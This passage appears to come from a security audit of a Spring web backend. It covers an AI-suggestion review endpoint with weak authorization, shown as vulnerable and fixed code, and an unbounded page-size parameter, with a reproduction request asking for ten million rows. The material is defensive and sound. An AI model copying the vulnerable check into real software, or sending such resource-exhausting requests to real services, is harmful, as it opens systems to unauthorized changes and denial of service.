Align with the platform model: require hasPermission('AI','READ') for listing/generation and a reviewer-level authority (e.g. hasPermission('AI','WRITE') or hasAnyRole(...)) for the /review accept-reject action. Add @Valid plus @NotNull/@Size constraints on the input records and bound the volume of drafts a caller can create.

▼ Before (vulnerable)
@PostMapping("/suggestions/{id}/review")
@PreAuthorize("isAuthenticated()")
public AiSuggestion review(@PathVariable Long id, @RequestBody ReviewBody body) { return service.review(id, body); }
▲ After (fixed)
@PostMapping("/suggestions/{id}/review")
@PreAuthorize("hasPermission('AI','WRITE')")
public AiSuggestion review(@PathVariable Long id, @Valid @RequestBody ReviewBody body) { return service.review(id, body); }

A caller can request size=1000000 and force the service to materialise a very large page from the tenant's data set. Reproduction

GET /api/sustainability/metrics?size=10000000 — the backend attempts to build a page of up to ten million rows.

Resolution

Clamp the page size to a sane maximum (e.g. min(size, 200)) in each controller or via a shared @ParameterObject Pageable resolver / PageableHandlerMethodArgumentResolver configured with a maxPageSize. For aggregate endpoints, prefer DB-side COUNT/GROUP BY queries over loading the full collection.
